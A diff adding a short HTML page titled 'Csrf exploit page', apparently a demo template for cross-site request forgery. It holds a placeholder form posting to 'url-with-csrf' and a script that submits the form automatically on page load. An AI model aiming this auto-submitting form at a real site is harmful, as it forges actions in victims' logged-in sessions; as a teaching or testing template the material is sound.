@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Csrf exploit page</title>
+</head>
+<body>
+<h1>Csrf exploit page</h1>
+<form method="post" id="idForm" action="url-with-csrf">
+  Your fake form
+  <button type="submit" class="btn btn-primary">Save</button>
+</form>
+<script>
+  form = document.getElementById("idForm");
+  form.submit();
+</script>
+</body>
+</html>
